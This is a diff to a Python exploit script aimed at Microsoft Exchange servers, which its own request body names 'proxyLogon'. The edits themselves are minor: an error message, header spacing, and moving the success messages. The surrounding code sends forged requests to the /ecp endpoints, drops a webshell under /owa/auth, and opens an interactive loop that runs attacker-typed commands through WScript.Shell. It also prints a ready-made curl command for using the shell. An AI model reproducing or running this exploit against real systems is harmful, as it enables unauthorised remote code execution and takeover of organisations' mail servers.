@@ -51,7 +51,7 @@ ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
                    verify=False
                    )
 if ct.status_code != 200:
-    print("Autodiscover Error!")
+    print("Autodiscover Error! (Email is invalid)")
     exit()
 if "<LegacyDN>" not in ct.text:
     print("Can not get LegacyDN!")
@@ -92,7 +92,7 @@ ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
     "Content-Type": "text/xml",
     "msExchLogonAccount": "%s" %sid,
     "msExchLogonMailbox": "%s" %sid,
-    "msExchTargetMailbox": "%s" % sid,
+    "msExchTargetMailbox": "%s" %sid,
     "User-Agent": user_agent
 },
                    data=proxyLogon_request,
@@ -113,7 +113,7 @@ ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={
         FQDN, sess_id, msExchEcpCanary),
     "msExchLogonAccount": "%s" %sid,
     "msExchLogonMailbox": "%s" %sid,
-    "msExchTargetMailbox": "%s" % sid,
+    "msExchTargetMailbox": "%s" %sid,
     "User-Agent": user_agent
 },
                   verify=False
@@ -130,7 +130,7 @@ ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
     "Content-Type": "application/json; charset=utf-8",
     "msExchLogonAccount": "%s" %sid,
     "msExchLogonMailbox": "%s" %sid,
-    "msExchTargetMailbox": "%s" % sid,
+    "msExchTargetMailbox": "%s" %sid,
     "User-Agent": user_agent
 
 },
@@ -156,7 +156,7 @@ ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
     "Content-Type": "application/json; charset=utf-8",
     "msExchLogonAccount": "%s" %sid,
     "msExchLogonMailbox": "%s" %sid,
-    "msExchTargetMailbox": "%s" % sid,
+    "msExchTargetMailbox": "%s" %sid,
     "User-Agent": user_agent
 },
                    json=oab_json,
@@ -187,11 +187,11 @@ ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
 if ct.status_code != 200:
     print("Write Shell Error!")
     exit()
-print('(+) Webshell drop at https://%s/owa/auth/%s .. Have fun!'%(target, shell_name))
-print('(+) Code: curl -ik https://%s/owa/auth/%s -d \'exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())\''%(target, shell_name))
 time.sleep(2)
 req_test = requests.get('https://%s/owa/auth/%s'%(target, shell_name), verify=False)
 if "OAB (Default Web Site)" in req_test.text:
+  print('(+) Webshell drop at https://%s/owa/auth/%s .. Have fun!'%(target, shell_name))
+  print('(+) Code: curl -ik https://%s/owa/auth/%s -d \'exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())\''%(target, shell_name))
   while True:
     cmd = input('CMD: ')
     shell_body_exec = '''exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall())'''%cmd
